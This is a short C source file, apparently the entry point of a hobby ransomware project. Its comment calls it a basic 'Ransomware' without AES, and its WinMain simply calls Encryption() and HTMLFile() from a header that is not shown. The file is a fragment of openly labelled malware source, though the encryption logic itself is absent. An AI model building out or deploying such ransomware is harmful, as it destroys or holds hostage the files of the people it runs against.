#include "encrypt.h"
#pragma warning(disable : 4996)

/*
I have to publish the code cuz of the 
dirent.h library. This is a pretty basic 
"Ransomware" like no AES to encrypt 
thats not really cool ik
*/

INT WINAPI __stdcall WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd
) {
	Encryption(); 
	HTMLFile();
}